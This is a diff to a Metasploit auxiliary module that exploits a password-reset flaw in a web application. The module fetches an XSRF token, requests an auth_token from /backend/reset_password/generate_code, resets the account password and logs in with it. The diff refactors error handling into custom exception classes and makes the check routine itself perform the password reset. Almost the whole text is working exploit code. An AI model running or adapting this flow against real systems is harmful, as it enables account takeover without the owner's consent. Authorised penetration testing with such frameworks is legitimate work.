@@ -2,6 +2,10 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   prepend Msf::Exploit::Remote::AutoCheck
 
+  class AuthTokenError < StandardError; end
+  class XsrfTokenError < StandardError; end
+  class ResetPasswordError < StandardError; end
+
   def initialize(info = {})
     super(
       update_info(
@@ -51,11 +55,12 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    fail_with(Failure::UnexpectedReply, 'Failed to get a 200 response from the server.') unless res&.code == 200
+    raise XsrfTokenError, 'Failed to get a 200 response from the server.' unless res&.code == 200
+
     print_good('Server reachable.')
 
     xsrf_token_value = res.get_cookies.scan(/XSRF-TOKEN=([^;]*)/).flatten[0]
-    fail_with(Failure::UnexpectedReply, 'XSRF Token not found') unless xsrf_token_value
+    raise XsrfTokenError, 'XSRF Token not found' unless xsrf_token_value
 
     decoded_xsrf_token = decode_url(xsrf_token_value)
     print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
@@ -79,11 +84,11 @@ class MetasploitModule < Msf::Auxiliary
       'data' => payload
     })
 
-    fail_with(Failure::UnexpectedReply, 'Request /backend/reset_password/generate_code to retrieve auth_token did not return a 200 response') unless res&.code == 200
+    raise AuthTokenError, 'Request /backend/reset_password/generate_code to retrieve auth_token did not return a 200 response' unless res&.code == 200
 
     json = res.get_json_document
     if json.key?('error_message')
-      fail_with(Failure::UnexpectedReply, json['error_message'])
+      raise AuthTokenError, json['error_message']
     elsif json.key?('auth_token')
       print_good('Retrieved auth_token: ' + json['auth_token'])
     end
@@ -113,26 +118,29 @@ class MetasploitModule < Msf::Auxiliary
       'data' => payload
     })
 
-    fail_with(Failure::UnexpectedReply, 'Password reset attempt failed') unless res&.code == 200
+    raise ResetPasswordError, 'Did not receive a 200 responce from backend/reset_password' unless res&.code == 200
 
     json = res.get_json_document
+    raise ResetPasswordError, "There was an error resetting the password: #{json['error_message']}" if json['error_message']
+
     json
   end
 
   def check
-    @xsrf_token_value = xsrf_token_value
+    begin
+      @xsrf_token_value = xsrf_token_value
+      @auth_token = auth_token(@xsrf_token_value)
+      @reset_password = reset_password(@xsrf_token_value, @auth_token)
+    rescue AuthTokenError, XsrfTokenError, ResetPasswordError => e
+      return Exploit::CheckCode::Unknown("Check method failed: #{e.class}, #{e}")
+    end
+
     return Exploit::CheckCode::Unknown('Unable to determine the version (xsrf_token_value missing).') unless @xsrf_token_value
-
-    @auth_token = auth_token(@xsrf_token_value)
     return Exploit::CheckCode::Unknown('Unable to determine the version (auth_token missing).') unless @auth_token
-
-    @reset_password = reset_password(@xsrf_token_value, @auth_token)
     return Exploit::CheckCode::Unknown('Unable to determine the version (reset_password failed).') unless @reset_password
 
-    if @reset_password.key?('error')
-      return Exploit::CheckCode::Safe
-    elsif @reset_password.key?('status')
-      return Exploit::CheckCode::Appears
+    if @reset_password.key?('status')
+      return Exploit::CheckCode::Appears('Password reset was successful, target is vulnerable')
     end
 
     Exploit::CheckCode::Unknown
@@ -145,9 +153,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    @xsrf_token_value ||= xsrf_token_value
-    @auth_token ||= auth_token(@xsrf_token_value)
-    @reset_password ||= reset_password(@xsrf_token_value, @auth_token)
+    begin
+      @xsrf_token_value ||= xsrf_token_value
+      @auth_token ||= auth_token(@xsrf_token_value)
+      @reset_password ||= reset_password(@xsrf_token_value, @auth_token)
+    rescue AuthTokenError, XsrfTokenError, ResetPasswordError => e
+      fail_with(Failure::UnexpectedReply, "Exploit pre-conditions were not met #{e.class}, #{e}")
+    end
+
+    fail_with(Failure::UnexpectedReply, 'Unable to determine the version (xsrf_token_value missing).') unless @xsrf_token_value
+    fail_with(Failure::UnexpectedReply, 'Unable to determine the version (auth_token missing).') unless @auth_token
+    fail_with(Failure::UnexpectedReply, 'Unable to determine the version (reset_password failed).') unless @reset_password
 
     # 4) Confirm that we can authenticate with the new password
     payload = {
